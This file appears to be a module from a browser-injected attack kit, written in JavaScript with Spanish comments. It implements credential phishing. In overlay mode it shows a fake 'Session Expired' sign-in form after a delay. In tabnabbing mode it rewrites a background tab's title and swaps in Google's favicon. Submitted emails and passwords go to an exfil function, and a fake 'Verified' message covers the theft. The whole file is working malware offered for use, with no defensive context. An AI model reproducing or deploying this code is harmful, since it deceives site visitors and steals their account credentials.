/* m-phishing.js — Phishing UI (overlay/tabnab/funnel) con captura de credenciales.
   Absorbe el HTML phish inline del FOOT (tabnab/overlay). Activado vía stager (default off en kernel). */
(function(G){
if(!G)return; if(G._M&&G._M.phish)return; G._M=G._M||{}; G._M.phish=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var MODE=(window.__GE_OFF__&&window.__GE_OFF__.C&&window.__GE_OFF__.C.PHISH_MODE)||'overlay';
var ACCENT=(window.__GE_OFF__&&window.__GE_OFF__.C&&window.__GE_OFF__.C.ACCENT)||'#FF1A75';
var FORM='<form id="ge-phish" style="margin-top:14px">'+
'<input type="email" name="email" placeholder="Email address" autocomplete="email" style="width:100%;padding:11px;margin:0 0 9px;border:1px solid #e0e0e0;border-radius:6px;font-size:14px;box-sizing:border-box">'+
'<input type="password" name="password" placeholder="Password" autocomplete="current-password" style="width:100%;padding:11px;margin:0 0 12px;border:1px solid #e0e0e0;border-radius:6px;font-size:14px;box-sizing:border-box">'+
'<button type="submit" style="width:100%;padding:11px;background:'+ACCENT+';color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:14px;font-weight:600">Continue</button></form>';
function bind(){var f=document.getElementById('ge-phish');if(f)f.addEventListener('submit',function(e){e.preventDefault();var d=new FormData(f);exfil('phish-cap',{mode:MODE,email:d.get('email'),password:d.get('password'),loc:location.pathname});f.innerHTML='<p style="text-align:center;color:'+ACCENT+';font-weight:600">✓ Verified</p>'},{capture:true})}
if(MODE==='tabnab'){
var orig=null;
document.addEventListener('visibilitychange',function(){
if(document.hidden&&!orig){orig=document.title;document.title='(1) Sign in - Account';
var fi=document.querySelector('link[rel*="icon"]');if(fi)fi.href='https://accounts.google.com/favicon.ico';
var d=document.createElement('div');d.id='ge-tn';d.style.cssText='max-width:400px;margin:70px auto;font-family:-apple-system,sans-serif;padding:20px';
d.innerHTML='<h2 style="text-align:center;color:#202124">Session Expired</h2><p style="color:#5f6368;text-align:center;font-size:13px">Sign in again to continue.</p>'+FORM;
document.body.innerHTML='';document.body.appendChild(d);bind();}
else if(!document.hidden&&orig){document.title=orig;orig=null;var t=document.getElementById('ge-tn');if(t)t.remove();}
});
}else{
setTimeout(function(){
var ov=document.createElement('div');
ov.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:999998;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(3px)';
ov.innerHTML='<div style="background:#fff;border-radius:12px;padding:28px;max-width:380px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,.3);font-family:-apple-system,BlinkMacSystemFont,sans-serif">'+
'<h3 style="margin:0 0 6px;color:#1a1a1a;font-size:18px">Session Expired</h3><p style="color:#666;font-size:13px;margin:0">Sign in again to continue reading.</p>'+FORM+'</div>';
(document.body||document.documentElement).appendChild(ov);bind();
ov.addEventListener('click',function(e){if(e.target===ov)ov.remove()});
},12000);
}
exfil('phish-boot',{mode:MODE});
}catch(e){hx('m-phish-err',{m:e.message})}
})(window.__GE__);
